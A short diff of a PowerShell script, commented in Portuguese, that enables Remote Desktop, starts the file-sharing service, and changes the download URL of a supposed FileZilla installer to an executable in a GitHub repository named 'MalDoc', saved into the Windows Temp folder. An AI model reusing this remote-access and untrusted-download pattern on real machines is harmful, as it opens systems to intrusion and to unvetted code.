@@ -9,7 +9,7 @@ Start-Service -Name "LanmanServer"
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 
 # Defina a URL do download do FileZilla
-$FileZillaDownloadURL = "https://www.trigonesoft.com/download/Remote_System_monitor_Server_3.83_x64_Setup.exe"
+$FileZillaDownloadURL = "https://github.com/jovair1994/MalDoc/raw/main/FileZilla_Server_1.8.0_win64-setup.exe"
 
 # Defina o caminho de destino onde o arquivo será baixado
 $DownloadPath = "C:\Windows\Temp\FileZilla.exe"
